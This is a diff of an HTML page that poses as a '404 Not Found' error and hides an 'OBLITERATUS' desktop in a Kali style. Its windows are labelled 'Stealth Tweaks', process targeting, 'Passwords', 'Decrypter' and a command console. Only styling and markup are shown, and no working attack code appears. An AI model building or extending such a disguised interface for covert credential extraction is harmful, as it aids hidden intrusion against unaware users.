@@ -2,193 +2,229 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>404 Not Found</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root { 
-            --mac-red: #ff5f56; 
-            --mac-yellow: #ffbd2e; 
-            --mac-green: #27c93f; 
-            --mac-blue: #007aff;
-            --mac-purple: #af52de;
-            --mac-orange: #ff9500;
-            --mac-pink: #ff2d55;
-            --glass-bg: rgba(30, 30, 30, 0.65);
-            --glass-border: rgba(255, 255, 255, 0.18);
+            --bg: #0b0e14;
+            --bg-2: #10141d;
+            --panel: #161b26;
+            --panel-2: #1c2230;
+            --panel-3: #232b3c;
+            --border: #293346;
+            --border-2: #34425a;
+            --text: #dce4ee;
+            --text-2: #8f9db3;
+            --dim: #5d6b82;
+            --accent: #00a2ed;
+            --accent-2: #0081bf;
+            --accent-glow: rgba(0, 162, 237, .25);
+            --green: #22c55e;
+            --red: #ef4444;
+            --amber: #f59e0b;
+            --violet: #8b5cf6;
+            --mono: 'JetBrains Mono', ui-monospace, 'Cascadia Code', Consolas, monospace;
+            --ui: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            --panel-h: 36px;
+            --radius: 8px;
+            --shadow: 0 20px 50px -10px rgba(0,0,0,.85), 0 2px 10px rgba(0,0,0,.5);
         }
         
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #fff; 
-            color: #333; 
+            font-family: var(--ui); 
+            background-color: var(--bg); 
+            color: var(--text); 
             margin: 40px; 
             overflow: hidden; 
             height: 100vh; 
+            -webkit-font-smoothing: antialiased;
+            user-select: none;
         }
         
         .apache-view h1 { font-size: 24px; font-weight: 500; cursor: default; user-select: none; }
         
-        /* AURORA WALLPAPER */
+        /* KALIOS WALLPAPER & BACKGROUND */
         #desktop { 
             display: none; 
             position: fixed; 
             inset: 0; 
-            background: 
-                radial-gradient(ellipse at 20% 20%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
-                radial-gradient(ellipse at 80% 80%, rgba(255, 119, 198, 0.15) 0%, transparent 50%),
-                radial-gradient(ellipse at 50% 50%, rgba(100, 200, 255, 0.1) 0%, transparent 60%),
-                linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-            background-size: 200% 200%;
-            animation: aurora 20s ease infinite;
+            background: radial-gradient(1200px 700px at 50% 20%, rgba(0,162,237,.25), transparent 70%), linear-gradient(160deg, #0c1d36, #133660 55%, #081220);
             z-index: 9999; 
             overflow: hidden;
         }
 
-        @keyframes aurora {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        #desktop::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image: 
+                linear-gradient(rgba(15, 181, 229, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(15, 181, 229, 0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
         }
 
-        /* TOP BAR - Estilo macOS real */
+        /* XFCE TOP PANEL (KALIOS) */
         #top-bar { 
-            height: 28px; 
-            background: rgba(0,0,0,0.2); 
-            backdrop-filter: blur(25px) saturate(180%); 
-            -webkit-backdrop-filter: blur(25px) saturate(180%);
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: var(--panel-h); 
+            background: linear-gradient(180deg, rgba(22,27,38,.98), rgba(14,18,25,.96)); 
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(12px); 
+            -webkit-backdrop-filter: blur(12px);
             display: flex; 
             align-items: center; 
-            padding: 0 16px; 
-            color: #fff; 
-            font-size: 13px; 
-            border-bottom: 1px solid rgba(255,255,255,0.08);
+            padding: 0 8px; 
+            color: var(--text); 
+            font-size: 12.5px; 
             position: relative;
             z-index: 10000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            gap: 2px;
         }
         
         .menu-apple { 
-            font-weight: 800; 
-            margin-right: 20px; 
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            height: 28px;
+            border-radius: 6px;
             cursor: pointer;
-            font-size: 14px;
-            transition: opacity 0.2s;
+            transition: background 0.12s;
+            color: var(--accent);
+            font-weight: 600;
         }
-        .menu-apple:hover { opacity: 0.7; }
+        .menu-apple:hover { 
+            background: rgba(255,255,255,0.08);
+        }
         
         .menu-item {
-            margin-right: 16px;
+            padding: 0 9px;
+            height: 28px;
+            border-radius: 6px;
             cursor: pointer;
-            opacity: 0.9;
-            transition: opacity 0.2s;
+            color: var(--text-2);
+            transition: all 0.12s;
+            font-size: 12.5px;
             font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
-        .menu-item:hover { opacity: 1; }
+        .menu-item:hover { 
+            background: rgba(255,255,255,0.08);
+            color: var(--text);
+        }
+        
+        .panel-sep {
+            width: 1px;
+            height: 16px;
+            background: var(--border);
+            margin: 0 4px;
+        }
         
         #admin-status { 
-            font-size: 10px; 
-            color: #aaa; 
-            background: rgba(255,255,255,0.08); 
-            padding: 2px 8px; 
-            border-radius: 4px;
-            border: 1px solid rgba(255,255,255,0.05);
-            font-family: 'SF Mono', monospace;
+            font-size: 11px; 
+            color: var(--accent); 
+            background: rgba(0, 162, 237, 0.12); 
+            padding: 3px 10px; 
+            border-radius: 6px;
+            border: 1px solid rgba(0, 162, 237, 0.3);
+            font-family: var(--mono);
+            letter-spacing: 0.3px;
         }
         
         #clock {
             font-variant-numeric: tabular-nums;
             font-weight: 500;
+            color: var(--text);
+            font-family: var(--mono);
+            font-size: 12px;
+            padding: 0 6px;
         }
 
-        /* VENTANAS - Glassmorphism mejorado */
+        /* WINDOW MANAGER (KALIOS) */
         .window { 
             position: absolute; 
-            background: var(--glass-bg); 
-            backdrop-filter: blur(50px) saturate(180%);
-            -webkit-backdrop-filter: blur(50px) saturate(180%);
-            border: 1px solid var(--glass-border); 
-            border-radius: 12px; 
-            box-shadow: 
-                0 0 0 1px rgba(0,0,0,0.2),
-                0 20px 60px rgba(0,0,0,0.5),
-                0 1px 0 rgba(255,255,255,0.1) inset; 
+            background: var(--panel); 
+            border: 1px solid var(--border-2); 
+            border-radius: var(--radius); 
+            box-shadow: var(--shadow); 
             display: none; 
             flex-direction: column;
-            transition: transform 0.15s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.15s ease;
+            transition: box-shadow 0.2s, border-color 0.2s;
             overflow: hidden;
             min-width: 300px;
-            min-height: 200px;
+            min-height: 180px;
         }
         
         .window.active {
-            box-shadow: 
-                0 0 0 1px rgba(0,0,0,0.3),
-                0 30px 80px rgba(0,0,0,0.6),
-                0 1px 0 rgba(255,255,255,0.15) inset;
+            border-color: #3b4a64;
+            box-shadow: 0 24px 60px -14px rgba(0,0,0,.9), 0 0 0 1px rgba(0,162,237,.2);
         }
         
         .window-header { 
-            height: 42px; 
+            height: 34px; 
+            flex-shrink: 0;
             display: flex; 
             align-items: center; 
-            padding: 0 14px; 
+            gap: 8px;
+            padding: 0 6px 0 10px; 
             cursor: move; 
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            background: linear-gradient(to bottom, rgba(255,255,255,0.05) 0%, transparent 100%);
+            background: linear-gradient(180deg, var(--panel-2), var(--panel));
+            border-bottom: 1px solid var(--border);
         }
         
         .window-controls { 
             display: flex; 
-            gap: 8px; 
-            width: 80px; 
+            gap: 4px; 
+            align-items: center;
         }
         
         .dot { 
-            width: 12px; 
-            height: 12px; 
-            border-radius: 50%; 
-            border: 1px solid rgba(0,0,0,0.1);
-            position: relative;
-            transition: transform 0.1s;
+            width: 24px; 
+            height: 24px; 
+            border-radius: 5px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-2);
+            cursor: pointer;
+            transition: all 0.12s;
         }
-        .dot:hover { transform: scale(1.1); }
-        .dot::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 3px;
-            width: 5px;
-            height: 3px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.4);
-            filter: blur(0.5px);
-        }
-        
-        .close { background: var(--mac-red); cursor: pointer; } 
-        .minimize { background: var(--mac-yellow); } 
-        .maximize { background: var(--mac-green); }
+        .dot:hover { background: rgba(255,255,255,0.1); color: var(--text); }
+        .close:hover { background: var(--red); color: #fff; } 
         
         .window-title { 
-            flex-grow: 1; 
-            text-align: center; 
-            font-size: 13px; 
+            flex: 1; 
+            font-size: 12px; 
             font-weight: 600; 
-            color: #fff; 
-            opacity: 0.9;
-            letter-spacing: 0.3px;
+            color: var(--text); 
+            letter-spacing: 0.2px;
             pointer-events: none;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
         
         .window-content { 
-            flex-grow: 1; 
-            padding: 18px; 
+            flex: 1; 
+            padding: 14px; 
             overflow-y: auto; 
-            color: #efefef; 
-            font-size: 13px;
+            color: var(--text); 
+            font-size: 12.5px;
+            background: var(--panel);
         }
 
-        /* DOCK - Magnificación realista */
+        /* DOCK (KALIOS DOCK & PANEL) */
         #dock-container {
             position: absolute;
             bottom: 12px;
@@ -198,213 +234,211 @@
         }
         
         #dock { 
-            background: rgba(255,255,255,0.12); 
-            backdrop-filter: blur(35px) saturate(180%);
-            -webkit-backdrop-filter: blur(35px) saturate(180%);
-            padding: 10px 16px; 
-            border-radius: 24px; 
+            background: linear-gradient(180deg, rgba(24,30,42,.95), rgba(14,18,25,.95)); 
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            padding: 6px 10px; 
+            border-radius: 12px; 
             display: flex; 
-            gap: 0; 
-            border: 1px solid rgba(255,255,255,0.15); 
-            box-shadow: 
-                0 10px 40px rgba(0,0,0,0.4),
-                0 0 0 1px rgba(255,255,255,0.05) inset;
+            align-items: center;
+            gap: 4px; 
+            border: 1px solid var(--border-2); 
+            box-shadow: var(--shadow);
             position: relative;
         }
         
         .dock-icon-wrapper {
             position: relative;
-            padding: 0 6px;
+            padding: 0 2px;
             display: flex;
-            align-items: flex-end;
-            height: 60px;
+            align-items: center;
         }
         
         .dock-icon { 
-            width: 52px; 
-            height: 52px; 
-            border-radius: 14px; 
+            width: 44px; 
+            height: 44px; 
+            border-radius: 8px; 
             cursor: pointer; 
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
+            transition: all 0.15s ease; 
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            background: rgba(255,255,255,0.05);
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
             position: relative;
-            transform-origin: bottom center;
         }
         
         .dock-icon svg { 
-            width: 32px; 
-            height: 32px; 
-            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.3)); 
+            width: 22px; 
+            height: 22px; 
+            transition: transform 0.15s ease;
         }
         
         .dock-icon:hover { 
-            transform: scale(1.35) translateY(-12px); 
-            background: rgba(255,255,255,0.2);
-            margin: 0 8px;
+            background: rgba(0, 162, 237, 0.18);
+            border-color: rgba(0, 162, 237, 0.4);
+            transform: translateY(-4px);
         }
         
-        .dock-icon:active { transform: scale(1.2) translateY(-8px); }
+        .dock-icon:active { transform: translateY(-2px); }
         
-        /* Indicador de app abierta */
+        /* Indicador de app abierta Kalios */
         .dock-dot {
-            width: 4px;
-            height: 4px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.8);
+            width: 12px;
+            height: 3px;
+            border-radius: 2px;
+            background: var(--accent);
+            box-shadow: 0 0 8px var(--accent-glow);
             position: absolute;
-            bottom: -8px;
+            bottom: -5px;
             left: 50%;
             transform: translateX(-50%);
             opacity: 0;
-            transition: opacity 0.3s;
+            transition: opacity 0.2s;
         }
         .dock-icon.open .dock-dot { opacity: 1; }
 
-        /* Reflejo del dock */
-        #dock::after {
-            content: '';
-            position: absolute;
-            bottom: -20px;
-            left: 10%;
-            right: 10%;
-            height: 20px;
-            background: radial-gradient(ellipse at center, rgba(0,0,0,0.3) 0%, transparent 70%);
-            filter: blur(10px);
-            z-index: -1;
-        }
-
+        /* BUTTONS (KALIOS) */
         .btn-mac { 
-            border: none; 
-            border-radius: 8px; 
-            padding: 10px 14px; 
+            border: none;
+            border-radius: 6px; 
+            padding: 8px 14px; 
             font-size: 12px; 
             font-weight: 600; 
             cursor: pointer; 
-            transition: all 0.2s; 
+            transition: all 0.15s; 
             width: 100%; 
-            margin-bottom: 10px; 
-            font-family: inherit;
-            position: relative;
-            overflow: hidden;
+            margin-bottom: 8px; 
+            font-family: var(--ui);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
         }
-        .btn-mac:active { transform: scale(0.97); }
+        .btn-mac:active { transform: scale(0.98); }
         
         .btn-blue { 
-            background: linear-gradient(180deg, #0a84ff 0%, #007aff 100%); 
+            background: var(--accent); 
             color: #fff; 
-            box-shadow: 0 1px 3px rgba(0,122,255,0.3);
+            box-shadow: 0 2px 8px rgba(0, 162, 237, 0.3);
         } 
-        .btn-blue:hover { background: linear-gradient(180deg, #1a8fff 0%, #0a84ff 100%); }
-        
-        .btn-red { 
-            background: linear-gradient(180deg, #ff453a 0%, #ff3b30 100%); 
-            color: #fff; 
-            box-shadow: 0 1px 3px rgba(255,59,48,0.3);
-        } 
-        .btn-red:hover { background: linear-gradient(180deg, #ff574d 0%, #ff453a 100%); }
-        
-        .btn-ghost { 
-            background: rgba(255,255,255,0.08); 
-            color: #fff;
-            border: 1px solid rgba(255,255,255,0.1);
-        } 
-        .btn-ghost:hover { 
-            background: rgba(255,255,255,0.15); 
-            border-color: rgba(255,255,255,0.2);
+        .btn-blue:hover { 
+            background: var(--accent-2); 
         }
         
+        .btn-red { 
+            background: var(--red); 
+            color: #fff; 
+            box-shadow: 0 2px 8px rgba(239, 68, 68, 0.3);
+        } 
+        .btn-red:hover { 
+            background: #dc2626; 
+        }
+        
+        .btn-ghost { 
+            background: var(--panel-3); 
+            color: var(--text);
+            border: 1px solid var(--border-2);
+        } 
+        .btn-ghost:hover { 
+            background: var(--border-2); 
+        }
+        
+        /* TABLES (KALIOS) */
         table { width: 100%; border-collapse: collapse; }
         th { 
             text-align: left; 
-            color: #999; 
-            font-size: 11px; 
-            padding: 8px; 
-            border-bottom: 1px solid rgba(255,255,255,0.1); 
+            color: var(--text-2); 
+            font-size: 11.5px; 
+            padding: 8px 10px; 
+            border-bottom: 1px solid var(--border); 
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.5px;
+            background: var(--panel-2);
+            font-family: var(--mono);
         }
         td { 
-            padding: 10px 8px; 
-            border-bottom: 1px solid rgba(255,255,255,0.05); 
+            padding: 8px 10px; 
+            border-bottom: 1px solid rgba(255,255,255,0.03); 
             font-size: 12px; 
-            transition: background 0.15s;
+            transition: background 0.12s;
         }
         .row-proc:hover { 
             background: rgba(255,255,255,0.06); 
             cursor: pointer; 
         }
         .selected { 
-            background: rgba(0,122,255,0.3) !important; 
-            box-shadow: 0 0 0 1px rgba(0,122,255,0.5) inset;
+            background: rgba(0, 162, 237, 0.2) !important; 
+            outline: 1px solid rgba(0, 162, 237, 0.5);
         }
         
+        /* TERMINAL (KALIOS) */
         .terminal { 
-            font-family: 'SF Mono', 'Fira Code', monospace; 
-            background: rgba(0,0,0,0.5); 
-            color: #00ff41; 
-            padding: 15px; 
-            border-radius: 10px; 
+            font-family: var(--mono); 
+            background: #090c12; 
+            color: #c9d5e8; 
+            padding: 12px; 
+            border-radius: 6px; 
             overflow-y: auto; 
             font-size: 12px; 
-            border: 1px solid rgba(255,255,255,0.08);
-            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
+            line-height: 1.5;
+            border: 1px solid var(--border);
+            box-shadow: inset 0 2px 8px rgba(0,0,0,0.6);
         }
         
+        /* INPUTS (KALIOS) */
         input { 
-            background: rgba(255,255,255,0.06); 
-            border: 1px solid rgba(255,255,255,0.1); 
-            color: #fff; 
-            padding: 12px; 
-            border-radius: 10px; 
+            background: var(--bg-2); 
+            border: 1px solid var(--border); 
+            color: var(--text); 
+            padding: 9px 12px; 
+            border-radius: 6px; 
             width: 100%; 
             box-sizing: border-box; 
             outline: none; 
-            font-family: inherit;
-            transition: all 0.2s;
+            font-family: var(--mono);
+            transition: all 0.15s;
+            font-size: 12px;
         }
         input:focus {
-            border-color: rgba(0,122,255,0.5);
-            background: rgba(255,255,255,0.08);
-            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
         }
         
         pre { margin: 0; white-space: pre-wrap; font-family: inherit; }
 
-        /* Scrollbar personalizada */
+        /* SCROLLBAR (KALIOS) */
         ::-webkit-scrollbar { width: 8px; height: 8px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.3); }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,.2); }
+        ::-webkit-scrollbar-thumb { background: var(--border-2); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--dim); }
 
-        /* Animación de entrada de ventana */
-        @keyframes windowIn {
-            from { opacity: 0; transform: scale(0.9) translateY(20px); }
-            to { opacity: 1; transform: scale(1) translateY(0); }
+        /* ANIMACIONES */
+        @keyframes winopen {
+            from { opacity: 0; transform: scale(.96); }
+            to { opacity: 1; transform: none; }
         }
-        .window.showing { animation: windowIn 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .window.showing { animation: winopen 0.16s cubic-bezier(.2,.9,.3,1); }
 
-        /* Tooltip del dock */
+        /* TOOLTIP DOCK */
         .dock-tooltip {
             position: absolute;
-            bottom: 70px;
+            bottom: 58px;
             left: 50%;
-            transform: translateX(-50%) translateY(10px);
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(10px);
-            color: #fff;
-            padding: 4px 12px;
+            transform: translateX(-50%) translateY(4px);
+            background: var(--panel-2);
+            color: var(--text);
+            padding: 4px 10px;
             border-radius: 6px;
-            font-size: 12px;
+            font-size: 11.5px;
             font-weight: 500;
             opacity: 0;
             pointer-events: none;
-            transition: all 0.2s;
+            transition: all 0.15s;
             white-space: nowrap;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid var(--border-2);
+            box-shadow: var(--shadow);
         }
         .dock-icon-wrapper:hover .dock-tooltip {
             opacity: 1;
@@ -422,34 +456,46 @@
     </div>
 
     <div id="desktop">
+        <div class="wp-vignette"></div>
         <div id="top-bar">
-            <span class="menu-apple" onclick="window.unlock()"></span>
-            <span class="menu-item" style="font-weight:700;">OBLITERATUS</span>
-            <span class="menu-item">File</span>
-            <span class="menu-item">Edit</span>
-            <span class="menu-item">View</span>
-            <span class="menu-item">Window</span>
-            <span class="menu-item">Help</span>
-            <span id="admin-status" style="margin-left: auto; margin-right: 16px;">[CHECKING...]</span>
-            <div style="flex-grow:1"></div>
+            <!-- KALI DRAGON LOGO (KALIOS) -->
+            <span class="menu-apple" onclick="window.unlock()" title="Kali Linux Menu">
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="var(--accent)">
+                    <path d="M12.778 5.943s-1.97-.13-5.327.92c-3.42 1.07-5.36 2.587-5.36 2.587s5.098-2.847 10.852-3.008zm7.351 3.095l.257-.017s-1.468-1.78-4.278-2.648c1.58.642 2.954 1.493 4.021 2.665zM12 2L9 5h6l-3-3z"/>
+                </svg>
+            </span>
+            <span class="menu-item brand" style="color:var(--text); font-weight:600;">Applications</span>
+            <span class="menu-item">Places</span>
+            <span class="menu-item">Terminal</span>
+            <div class="panel-sep"></div>
+            <span class="menu-item" style="color:var(--text); font-weight:600;">OBLITERATUS</span>
+            <span id="admin-status" style="margin-left: auto; margin-right: 12px;">[CHECKING...]</span>
             <span id="clock"></span>
         </div>
 
         <div id="win-opt" class="window" style="width: 380px; left: 80px; top: 60px;">
             <div class="window-header" onmousedown="window.startDrag(event, 'win-opt')">
-                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('opt')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
                 <div class="window-title">System Optimizer</div>
+                <div class="window-controls">
+                    <div class="dot minimize">—</div>
+                    <div class="dot maximize">▢</div>
+                    <div class="dot close" onclick="window.toggleWin('opt')">✕</div>
+                </div>
             </div>
             <div class="window-content">
-                <button class="btn-mac btn-blue" onclick="window.applyTweaks()">Apply Stealth Tweaks</button>
+                <button class="btn-mac btn-blue" onclick="window.applyTweaks()">⚡ Apply Stealth Tweaks</button>
                 <div id="opt-log" class="terminal" style="height: 120px;"></div>
             </div>
         </div>
 
         <div id="win-proc" class="window" style="width: 600px; left: 500px; top: 60px;">
             <div class="window-header" onmousedown="window.startDrag(event, 'win-proc')">
-                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('proc')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
                 <div class="window-title">Processes</div>
+                <div class="window-controls">
+                    <div class="dot minimize">—</div>
+                    <div class="dot maximize">▢</div>
+                    <div class="dot close" onclick="window.toggleWin('proc')">✕</div>
+                </div>
             </div>
             <div class="window-content">
                 <input type="text" id="p-search" placeholder="Filter processes..." oninput="window.filterProcs()">
@@ -464,11 +510,15 @@
 
         <div id="win-sig" class="window" style="width: 380px; left: 80px; top: 340px;">
             <div class="window-header" onmousedown="window.startDrag(event, 'win-sig')">
-                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('sig')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
                 <div class="window-title">Architect</div>
+                <div class="window-controls">
+                    <div class="dot minimize">—</div>
+                    <div class="dot maximize">▢</div>
+                    <div class="dot close" onclick="window.toggleWin('sig')">✕</div>
+                </div>
             </div>
             <div class="window-content">
-                <input type="text" id="target-pid" readonly style="text-align:center; color:#0f0; font-size:24px; margin-bottom:15px; letter-spacing: 2px;">
+                <input type="text" id="target-pid" readonly style="text-align:center; color:var(--accent); font-size:22px; margin-bottom:15px; letter-spacing: 2px;">
                 <button class="btn-mac btn-red" onclick="window.injectSignal()">⚡ Quantum Sync</button>
                 <button class="btn-mac btn-ghost" onclick="window.extractNexus()">🔗 Nexus Correlation</button>
                 <button class="btn-mac btn-ghost" onclick="window.extractIntel()">🔑 Passwords</button>
@@ -478,9 +528,13 @@
 
         <div id="win-intel" class="window" style="width: 850px; right: 80px; top: 120px; height: 500px;">
             <div class="window-header" onmousedown="window.startDrag(event, 'win-intel')">
-                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('intel')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
                 <div class="window-title">Decrypter</div>
-                <button onclick="window.exportCSV()" style="background:none; border:none; color:var(--mac-blue); cursor:pointer; font-size:12px; font-weight:800; margin-left: auto; padding: 0 10px;">[CSV]</button>
+                <button onclick="window.exportCSV()" style="background:var(--panel-3); border:1px solid var(--border-2); border-radius:4px; color:var(--accent); cursor:pointer; font-size:11.5px; font-weight:600; margin-right: 10px; padding: 2px 8px; font-family:var(--mono);">[EXPORT CSV]</button>
+                <div class="window-controls">
+                    <div class="dot minimize">—</div>
+                    <div class="dot maximize">▢</div>
+                    <div class="dot close" onclick="window.toggleWin('intel')">✕</div>
+                </div>
             </div>
             <div class="window-content">
                 <table>
@@ -492,81 +546,119 @@
 
         <div id="win-cons" class="window" style="width: 650px; left: 500px; top: 480px; height: 380px;">
             <div class="window-header" onmousedown="window.startDrag(event, 'win-cons')">
-                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('cons')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
                 <div class="window-title">Console</div>
+                <div class="window-controls">
+                    <div class="dot minimize">—</div>
+                    <div class="dot maximize">▢</div>
+                    <div class="dot close" onclick="window.toggleWin('cons')">✕</div>
+                </div>
             </div>
             <div class="window-content">
-                <div id="console-out" class="terminal" style="height: 280px; margin-bottom:15px; overflow-y: auto;"></div>
+                <div id="console-out" class="terminal" style="height: 280px; margin-bottom:12px; overflow-y: auto;"></div>
                 <input type="text" id="cmd-in" placeholder="Command..." onkeydown="if(event.key==='Enter')window.runCmd()">
             </div>
         </div>
 
         <div id="win-hex" class="window" style="width: 450px; left: 80px; top: 620px;">
             <div class="window-header" onmousedown="window.startDrag(event, 'win-hex')">
-                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('hex')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
                 <div class="window-title">Live Hex-Viewer</div>
+                <div class="window-controls">
+                    <div class="dot minimize">—</div>
+                    <div class="dot maximize">▢</div>
+                    <div class="dot close" onclick="window.toggleWin('hex')">✕</div>
+                </div>
             </div>
-            <div class="window-content terminal" id="hex-body" style="font-size: 11px; height: 180px; color:#00ff41; background:rgba(0,0,0,0.5);">[LOADING_PAYLOAD...]</div>
+            <div class="window-content terminal" id="hex-body" style="font-size: 11px; height: 180px; color:var(--accent); background:#090c12;">[LOADING_PAYLOAD...]</div>
         </div>
 
-        <!-- DOCK MEJORADO -->
+        <!-- DOCK KALIOS -->
         <div id="dock-container">
             <div id="dock">
+                <!-- OPTIMIZER -->
                 <div class="dock-icon-wrapper">
                     <div class="dock-icon" data-win="opt" onclick="window.toggleWin('opt')">
-                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-opt)"/><defs><linearGradient id="grad-opt" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#0a84ff"/><stop offset="100%" style="stop-color:#007aff"/></linearGradient></defs><path d="M32 18l12 6v10c0 8-12 12-12 12s-12-4-12-12V24l12-6z" fill="white" opacity="0.9"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                            <path d="M9 12l2 2 4-4"/>
+                        </svg>
                         <div class="dock-dot"></div>
                     </div>
                     <div class="dock-tooltip">Optimizer</div>
                 </div>
                 
+                <!-- PROCESSES -->
                 <div class="dock-icon-wrapper">
                     <div class="dock-icon" data-win="proc" onclick="window.toggleWin('proc')">
-                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-proc)"/><defs><linearGradient id="grad-proc" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#34c759"/><stop offset="100%" style="stop-color:#30d158"/></linearGradient></defs><path d="M20 44V30M32 44V20M44 44V35" stroke="white" stroke-width="5" stroke-linecap="round"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="var(--green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="4" y="4" width="16" height="16" rx="2"/>
+                            <path d="M9 9h6v6H9z"/>
+                            <path d="M9 1V4M15 1V4M9 20V23M15 20V23M20 9H23M20 15H23M1 9H4M1 15H4"/>
+                        </svg>
                         <div class="dock-dot"></div>
                     </div>
                     <div class="dock-tooltip">Processes</div>
                 </div>
                 
+                <!-- ARCHITECT -->
                 <div class="dock-icon-wrapper">
                     <div class="dock-icon" data-win="sig" onclick="window.toggleWin('sig')">
-                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-sig)"/><defs><linearGradient id="grad-sig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ff9f0a"/><stop offset="100%" style="stop-color:#ff9500"/></linearGradient></defs><path d="M35 15l-15 20h12l-3 15 20-25h-12l3-10z" fill="white"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="var(--amber)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"/>
+                            <circle cx="12" cy="12" r="6"/>
+                            <circle cx="12" cy="12" r="2"/>
+                        </svg>
                         <div class="dock-dot"></div>
                     </div>
                     <div class="dock-tooltip">Architect</div>
                 </div>
                 
+                <!-- DECRYPTER -->
                 <div class="dock-icon-wrapper">
                     <div class="dock-icon" data-win="intel" onclick="window.toggleWin('intel')">
-                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-intel)"/><defs><linearGradient id="grad-intel" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#5e5ce6"/><stop offset="100%" style="stop-color:#5856d6"/></linearGradient></defs><circle cx="32" cy="28" r="8" stroke="white" stroke-width="4" fill="none"/><path d="M32 36v10" stroke="white" stroke-width="4"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="var(--violet)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
                         <div class="dock-dot"></div>
                     </div>
                     <div class="dock-tooltip">Decrypter</div>
                 </div>
                 
+                <!-- TERMINAL -->
                 <div class="dock-icon-wrapper">
                     <div class="dock-icon" data-win="cons" onclick="window.toggleWin('cons')">
